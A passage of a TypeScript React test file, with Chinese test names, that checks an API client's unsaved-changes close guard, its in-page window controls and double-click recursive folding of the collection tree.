          handler = null;
        };
      },
      close: async () => {},
      minimize: async () => {},
      toggleMaximize: async () => {},
      startDragging: async () => {},
      startResizeDragging: async (_direction: string) => {},
      isMaximized: async () => false,
      onResized: async (_next: () => void) => () => {},
    };
    return {
      closer,
      requestClose: (): Promise<boolean> => handler?.() ?? Promise.resolve(true),
    };
  }

  async function openDirty(client: Commands, closer: { onCloseRequested: unknown }) {
    render(<App client={client} windowCloser={closer as never} />);
    await openRequest();
    fireEvent.change(screen.getByLabelText('请求地址'), {
      target: { value: 'https://api.test/edited' },
    });
    await screen.findByText('未保存');
  }

  const url = () => (screen.getByLabelText('请求地址') as HTMLInputElement).value;

  it('有未保存改动时先询问，取消则窗口不关', async () => {
    const { client } = harness();
    const win = fakeWindow();
    await openDirty(client, win.closer);

    let closing: Promise<boolean> = Promise.resolve(true);
    await act(async () => {
      closing = win.requestClose();
    });

    expect(screen.getByTestId('unsaved-guard')).toBeTruthy();

    fireEvent.click(screen.getByText('取消'));
    await waitFor(() => expect(screen.queryByTestId('unsaved-guard')).toBeNull());

    expect(await closing).toBe(false);
    // 编辑内容与未保存标记都没动
    expect(url()).toBe('https://api.test/edited');
    expect(screen.getByText('未保存')).toBeTruthy();
  });

  it('选择不保存则窗口关闭', async () => {
    const { client } = harness();
    const win = fakeWindow();
    await openDirty(client, win.closer);

    let closing: Promise<boolean> = Promise.resolve(false);
    await act(async () => {
      closing = win.requestClose();
    });
    fireEvent.click(screen.getByText('不保存'));

    expect(await closing).toBe(true);
  });

  it('保存并继续：先落库，再允许窗口关闭', async () => {
    const { client, requestSave } = harness();
    const win = fakeWindow();
    await openDirty(client, win.closer);

    let closing: Promise<boolean> = Promise.resolve(false);
    await act(async () => {
      closing = win.requestClose();
    });
    fireEvent.click(screen.getByText('保存并继续'));

    await waitFor(() => expect(requestSave).toHaveBeenCalledTimes(1));
    expect(await closing).toBe(true);
  });

  it('保存失败则窗口不关', async () => {
    const { client, requestSave } = harness();
    requestSave.mockRejectedValueOnce({ code: 'io', message: '写不进去' });
    const win = fakeWindow();
    await openDirty(client, win.closer);

    let closing: Promise<boolean> = Promise.resolve(false);
    await act(async () => {
      closing = win.requestClose();
    });
    fireEvent.click(screen.getByText('保存并继续'));

    await waitFor(() =>
      expect(screen.getByTestId('app-error').textContent).toContain('写不进去'),
    );
    expect(await closing).toBe(false);
  });

  it('没有未保存改动时直接关闭，不出现提示', async () => {
    const { client } = harness();
    const win = fakeWindow();
    render(<App client={client} windowCloser={win.closer as never} />);
    await openRequest();

    let closing: Promise<boolean> = Promise.resolve(false);
    await act(async () => {
      closing = win.requestClose();
    });

    expect(await closing).toBe(true);
    expect(screen.queryByTestId('unsaved-guard')).toBeNull();
  });

  it('页面重载被拦截（beforeunload 兜底）', async () => {
    const { client } = harness();
    render(<App client={client} />);
    await openRequest();

    // 没有未保存改动：不拦重载
    const idle = new Event('beforeunload', { cancelable: true });
    window.dispatchEvent(idle);
    expect(idle.defaultPrevented).toBe(false);

    fireEvent.change(screen.getByLabelText('请求地址'), {
      target: { value: 'https://api.test/edited' },
    });
    await screen.findByText('未保存');

    const dirty = new Event('beforeunload', { cancelable: true });
    window.dispatchEvent(dirty);
    expect(dirty.defaultPrevented).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// 页面内窗口控制（change: add-in-page-window-controls）
// ---------------------------------------------------------------------------

describe('页面内窗口控制', () => {
  /** 完整的假窗口控制口：记录 close / minimize / toggleMaximize 等调用，
   * 最大化状态在 toggleMaximize 时翻转并触发 resize 订阅，供图标跟随断言。 */
  function fullFakeWindow() {
    let handler: (() => Promise<boolean>) | null = null;
    let resizeHandler: (() => void) | null = null;
    let maximized = false;
    const calls = {
      close: 0,
      minimize: 0,
      toggleMaximize: 0,
      startDragging: 0,
      resizeDirections: [] as string[],
    };
    const closer = {
      onCloseRequested: async (next: () => Promise<boolean>) => {
        handler = next;
        return () => {
          handler = null;
        };
      },
      close: async () => {
        calls.close += 1;
      },
      minimize: async () => {
        calls.minimize += 1;
      },
      toggleMaximize: async () => {
        calls.toggleMaximize += 1;
        maximized = !maximized;
        resizeHandler?.();
      },
      startDragging: async () => {
        calls.startDragging += 1;
      },
      startResizeDragging: async (direction: string) => {
        calls.resizeDirections.push(direction);
      },
      isMaximized: async () => maximized,
      onResized: async (next: () => void) => {
        resizeHandler = next;
        return () => {
          resizeHandler = null;
        };
      },
    };
    return {
      closer,
      calls,
      requestClose: (): Promise<boolean> => handler?.() ?? Promise.resolve(true),
    };
  }

  it('会话标签行最右端渲染三个窗口控制按钮并接通窗口调用', async () => {
    const { client } = harness();
    const win = fullFakeWindow();
    render(<App client={client} windowCloser={win.closer as never} />);
    await openRequest();

    fireEvent.click(screen.getByRole('button', { name: '最小化' }));
    await waitFor(() => expect(win.calls.minimize).toBe(1));

    fireEvent.click(screen.getByRole('button', { name: '最大化' }));
    await waitFor(() => expect(win.calls.toggleMaximize).toBe(1));
    // 最大化后按钮跟随真实状态变成「还原」，再点一次切回
    fireEvent.click(await screen.findByRole('button', { name: '还原' }));
    await waitFor(() => expect(win.calls.toggleMaximize).toBe(2));
    expect(await screen.findByRole('button', { name: '最大化' })).toBeTruthy();
  });

  it('窗口控制按钮在各会话状态（空态 / 请求 / 实体 / 环境）下均完整可见', async () => {
    const { client } = harness({ folder: makeFolder() });
    const win = fullFakeWindow();
    render(<App client={client} windowCloser={win.closer as never} />);
    const allPresent = () =>
      ['最小化', '最大化', '关闭'].every((name) => Boolean(screen.getByRole('button', { name })));

    // 空态：没有选中任何请求 / 实体
    expect(allPresent()).toBe(true);

    // 请求
    await openRequest();
    expect(allPresent()).toBe(true);

    // 集合 / 文件夹实体脚本面板
    fireEvent.click(tree().getByText('我的文件夹'));
    await screen.findByLabelText('文件夹前置脚本');
    expect(allPresent()).toBe(true);

    // 环境（主区为环境编辑器）
    fireEvent.click(screen.getByRole('tab', { name: 'Environments' }));
    await screen.findByRole('listbox', { name: '环境列表' });
    expect(allPresent()).toBe(true);
  });

  it('页面内关闭按钮：没有未保存改动时直接关窗', async () => {
    const { client } = harness();
    const win = fullFakeWindow();
    render(<App client={client} windowCloser={win.closer as never} />);
    await openRequest();

    fireEvent.click(screen.getByRole('button', { name: '关闭' }));

    await waitFor(() => expect(win.calls.close).toBe(1));
    expect(screen.queryByTestId('unsaved-guard')).toBeNull();
  });

  it('页面内关闭按钮与原生关闭走同一守卫：有改动先问，不保存后关窗', async () => {
    const { client } = harness();
    const win = fullFakeWindow();
    render(<App client={client} windowCloser={win.closer as never} />);
    await openRequest();
    fireEvent.change(screen.getByLabelText('请求地址'), {
      target: { value: 'https://api.test/edited' },
    });
    await screen.findByText('未保存');

    fireEvent.click(screen.getByRole('button', { name: '关闭' }));

    expect(screen.getByTestId('unsaved-guard')).toBeTruthy();
    expect(win.calls.close).toBe(0);

    fireEvent.click(screen.getByText('不保存'));
    await waitFor(() => expect(win.calls.close).toBe(1));
  });

  it('页面内关闭按钮：取消则不关窗', async () => {
    const { client } = harness();
    const win = fullFakeWindow();
    render(<App client={client} windowCloser={win.closer as never} />);
    await openRequest();
    fireEvent.change(screen.getByLabelText('请求地址'), {
      target: { value: 'https://api.test/edited' },
    });
    await screen.findByText('未保存');

    fireEvent.click(screen.getByRole('button', { name: '关闭' }));
    fireEvent.click(screen.getByText('取消'));

    await waitFor(() => expect(screen.queryByTestId('unsaved-guard')).toBeNull());
    expect(win.calls.close).toBe(0);
  });

  it('标签行拖拽：非交互区域触发 startDragging，交互控件不触发，双击切换最大化', async () => {
    const { client } = harness();
    const win = fullFakeWindow();
    render(<App client={client} windowCloser={win.closer as never} />);
    await openRequest();

    const bar = screen.getByTestId('session-bar');
    // 行内空白（grow 弹性区）：拖拽
    fireEvent.mouseDown(bar.querySelector('.grow')!, { button: 0 });
    // 双击（detail === 2）：切换最大化
    fireEvent.mouseDown(bar.querySelector('.grow')!, { button: 0, detail: 2 });
    // 交互控件不触发拖拽
    fireEvent.mouseDown(document.querySelector('.env-select select')!, { button: 0 });
    fireEvent.mouseDown(screen.getByRole('button', { name: '最小化' }), { button: 0 });

    await waitFor(() => expect(win.calls.startDragging).toBe(1));
    await waitFor(() => expect(win.calls.toggleMaximize).toBe(1));
  });

  it('缩放边条：八个方向各自映射到 startResizeDragging', async () => {
    const { client } = harness();
    const win = fullFakeWindow();
    render(<App client={client} windowCloser={win.closer as never} />);
    await openRequest();

    const directions = ['n', 's', 'e', 'w', 'nw', 'ne', 'sw', 'se'];
    for (const direction of directions) {
      fireEvent.pointerDown(document.querySelector(`.resize-strip.${direction}`)!, { button: 0 });
    }

    expect(win.calls.resizeDirections).toEqual([
      'North',
      'South',
      'East',
      'West',
      'NorthWest',
      'NorthEast',
      'SouthWest',
      'SouthEast',
    ]);
  });
});

// ---------------------------------------------------------------------------
// 集合树双击递归折叠/展开（change: tree-recursive-collapse-expand）
// ---------------------------------------------------------------------------

/** 一棵两层嵌套文件夹的树：外层 →（内层 → 深处的请求）+ 外层请求。 */
function nestedTrees(): CollectionTree[] {
  return [
    {
      collection,
      children: [
        folderNode('外层', [
          folderNode('内层', [requestNode('深处的请求', 'https://api.test/deep')]),
          requestNode('外层请求', 'https://api.test/outer'),
        ]),
      ],
    },
  ];
}

/** 一个默认不选中、动作全是 spy 的 WorkspaceTree 渲染。 */
function renderTree() {
  const actions = {
    onSelectRequest: vi.fn(),
    onSelectEntity: vi.fn(),
    onNewCollection: vi.fn(),
    onNewRequest: vi.fn(),
    onNewFolder: vi.fn(),
    onDeleteCollection: vi.fn(),
    onDeleteFolder: vi.fn(),
    onDeleteRequest: vi.fn(),
    onRenameEntity: vi.fn(),
    onRenameRequest: vi.fn(),
    onImport: vi.fn(),
  };
  render(
    <WorkspaceTree
      trees={nestedTrees()}
      selectedRequestId={null}
      selectedEntity={null}
      {...actions}
    />,
  );
  return { actions, view: within(screen.getByTestId('workspace-tree')) };
}

/** 模拟浏览器双击：两次单击（触发去抖选中）+ 一次 dblclick（取消选中并递归切换）。 */
function doubleClick(element: HTMLElement) {
  fireEvent.click(element);
  fireEvent.click(element);
  fireEvent.doubleClick(element);
}

describe('集合树的双击递归折叠/展开（tree-recursive-collapse-expand）', () => {
  it('双击展开态目录名递归折叠整棵子树（4.1）', () => {
    const { actions, view } = renderTree();
    const outer = view.getByLabelText('折叠 外层') as HTMLButtonElement;

    expect(outer.getAttribute('aria-expanded')).toBe('true');

    doubleClick(view.getByText('外层'));

    expect(outer.getAttribute('aria-expanded')).toBe('false');
    expect(view.queryByText('内层')).toBeNull();
    expect(view.queryByText('深处的请求')).toBeNull();
    expect(view.queryByText('外层请求')).toBeNull();
    // 双击不选中实体，主区不应被切换
    expect(actions.onSelectEntity).not.toHaveBeenCalled();
  });

  it('再次双击折叠态目录名递归展开整棵子树（4.2）', () => {
    const { view } = renderTree();
    const outer = view.getByLabelText('折叠 外层') as HTMLButtonElement;

    doubleClick(view.getByText('外层'));
    expect(outer.getAttribute('aria-expanded')).toBe('false');

    doubleClick(view.getByText('外层'));
    expect(outer.getAttribute('aria-expanded')).toBe('true');
    expect(view.queryByText('深处的请求')).not.toBeNull();
    expect(view.queryByText('外层请求')).not.toBeNull();
  });

  it('双击不选中实体、不切换主区；单击仍选中（仅延迟）（4.3）', async () => {
    const harnessed = harness({ folder: makeFolder({ id: '外层', name: '外层' }) });
    const client = { ...harnessed.client, workspaceTree: async () => nestedTrees() };

    render(<App client={client} />);
    await tree().findByText('外层');

    // 双击只折叠/展开，不把主区切到脚本面板
    doubleClick(tree().getByText('外层'));
    expect(screen.queryByTestId('entity-script-panel')).toBeNull();

    // 单击走 ~200ms 去抖后，主区切换到实体脚本面板
    fireEvent.click(tree().getByText('外层'));
    await waitFor(() =>
      expect(screen.queryByTestId('entity-script-panel')).not.toBeNull(),
    );
  });

  it('搜索态双击无效；祖先折叠时双击整展开会清理后代折叠（4.4）', () => {
    const { view } = renderTree();
    const outer = view.getByLabelText('折叠 外层') as HTMLButtonElement;
    const inner = view.getByLabelText('折叠 内层') as HTMLButtonElement;

    // 先折叠内层（后代部分折叠）
    fireEvent.click(inner);
    expect(inner.getAttribute('aria-expanded')).toBe('false');
    expect(view.queryByText('深处的请求')).toBeNull();

    // 折叠祖先，整棵子树隐藏
    doubleClick(view.getByText('外层'));
    expect(outer.getAttribute('aria-expanded')).toBe('false');

    // 再双击祖先 → 递归展开，后代的折叠被一并清除
    doubleClick(view.getByText('外层'));
    expect(outer.getAttribute('aria-expanded')).toBe('true');
    const innerAfter = view.getByLabelText('折叠 内层') as HTMLButtonElement;
    expect(innerAfter.getAttribute('aria-expanded')).toBe('true');
    expect(view.queryByText('深处的请求')).not.toBeNull();

    // 搜索态下双击不改变折叠集合
    fireEvent.change(view.getByLabelText('搜索请求'), { target: { value: '深处' } });
    expect((view.getByLabelText('折叠 外层') as HTMLButtonElement).disabled).toBe(true);
    doubleClick(view.getByText('外层'));
    expect((view.getByLabelText('折叠 外层') as HTMLButtonElement).getAttribute('aria-expanded')).toBe(
      'true',
    );
    fireEvent.change(view.getByLabelText('搜索请求'), { target: { value: '' } });
    expect((view.getByLabelText('折叠 外层') as HTMLButtonElement).getAttribute('aria-expanded')).toBe(
      'true',
    );
  });

  it('双击集合名递归折叠/展开整棵集合子树（collection 同样支持）', () => {
    const { view } = renderTree();
    const collection = view.getByLabelText('折叠 我的集合') as HTMLButtonElement;

    expect(collection.getAttribute('aria-expanded')).toBe('true');
    expect(view.queryByText('外层')).not.toBeNull();
    expect(view.queryByText('深处的请求')).not.toBeNull();

    doubleClick(view.getByText('我的集合'));
    expect(collection.getAttribute('aria-expanded')).toBe('false');
    expect(view.queryByText('外层')).toBeNull();
    expect(view.queryByText('深处的请求')).toBeNull();

    doubleClick(view.getByText('我的集合'));
    expect(collection.getAttribute('aria-expanded')).toBe('true');
    expect(view.queryByText('外层')).not.toBeNull();
    expect(view.queryByText('深处的请求')).not.toBeNull();
  });

  it('双击目录行空白区（非名称文本）同样递归折叠', () => {
    const { view } = renderTree();
    const toggle = view.getByLabelText('折叠 外层') as HTMLButtonElement;
    const row = toggle.closest('.node') as HTMLElement;

    expect(toggle.getAttribute('aria-expanded')).toBe('true');
    expect(view.queryByText('深处的请求')).not.toBeNull();

    doubleClick(row);
    expect(toggle.getAttribute('aria-expanded')).toBe('false');
    expect(view.queryByText('深处的请求')).toBeNull();

    doubleClick(row);
    expect(toggle.getAttribute('aria-expanded')).toBe('true');
    expect(view.queryByText('深处的请求')).not.toBeNull();
  });

  it('双击「更多」按钮不触发递归折叠（只切换菜单）', () => {
    const { view } = renderTree();
    const toggle = view.getByLabelText('折叠 外层') as HTMLButtonElement;
    const row = toggle.closest('.node') as HTMLElement;

    fireEvent.mouseEnter(row);
    const more = view.getByLabelText('更多操作') as HTMLButtonElement;
    expect(toggle.getAttribute('aria-expanded')).toBe('true');
    expect(view.queryByText('深处的请求')).not.toBeNull();

    doubleClick(more);
    // 子树未被递归折叠：箭头仍展开、后代请求仍可见
    expect(toggle.getAttribute('aria-expanded')).toBe('true');
    expect(view.queryByText('深处的请求')).not.toBeNull();
  });
});
